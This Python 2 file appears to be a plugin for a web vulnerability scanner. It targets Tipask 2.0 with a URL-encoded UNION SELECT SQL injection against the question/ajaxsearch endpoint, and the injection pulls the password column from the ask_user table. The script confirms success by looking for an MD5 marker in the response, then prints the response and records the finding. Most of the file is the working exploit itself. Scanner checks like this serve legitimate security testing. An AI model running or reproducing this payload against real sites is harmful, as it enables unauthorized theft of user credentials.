#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "?question/ajaxsearch/%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2Cconcat%28md5%28333%29%2Cchar%280x3d%29%2Cpassword%29%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%20from%20ask_user%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            print "*"*100
            print url
            print "*"*100
            print content
            print "*"*100
          
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:File:Tipask2_0_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Tipask2_0_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def